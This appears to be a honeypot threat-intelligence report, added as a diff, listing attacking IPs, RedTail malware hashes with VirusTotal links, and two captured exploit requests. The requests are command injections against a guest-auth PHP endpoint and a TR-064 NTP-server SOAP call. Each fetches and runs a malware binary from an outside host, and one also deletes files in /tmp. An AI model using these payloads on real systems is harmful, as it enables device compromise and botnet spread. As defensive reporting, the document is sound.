@@ -1,0 +1,51 @@
+Top 5 IPs for 2024-06-15 :
+
+77.120.163.73
+159.223.85.173
+58.27.95.2
+117.63.71.94
+125.23.27.26
+
+Malware Observed:
+
+File name : redtail.arm7
+ea9f3911ff2884621874c1e98b5dc9139964adeab333b92816eb5c307d73a67f
+https://www.virustotal.com/gui/file/ea9f3911ff2884621874c1e98b5dc9139964adeab333b92816eb5c307d73a67f
+
+File name : redtail.arm8
+720b3d089679f26e02c2f9bf05a466e768557b91627e840a2cd26eb480dc8418
+https://www.virustotal.com/gui/file/720b3d089679f26e02c2f9bf05a466e768557b91627e840a2cd26eb480dc8418
+
+File name : redtail.i686
+9ef2ef02376445bf4c145820c0c81f2bbe0b96f2017278562e0bd259bf7bd061
+https://www.virustotal.com/gui/file/9ef2ef02376445bf4c145820c0c81f2bbe0b96f2017278562e0bd259bf7bd061
+
+File name : redtail.x86_64
+ab897157fdef11b267e986ef286fd44a699e3699a458d90994e020619653d2cd
+https://www.virustotal.com/gui/file/ab897157fdef11b267e986ef286fd44a699e3699a458d90994e020619653d2cd
+
+
+
+Commands/exploits observed:
+
+POST /guest_auth/guestIsUp.php HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 131
+Host: Host IP
+mac=1&ip=127.0.0.1|wget%20http%3A%2F%2F45.128.232.200%2Fpoopshellmips%3B%20chmod%20777%20poopshellmips%3B%20.%2Fpoopshellmips%20%26
+
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:5555
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://123.10.156.240:52071/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
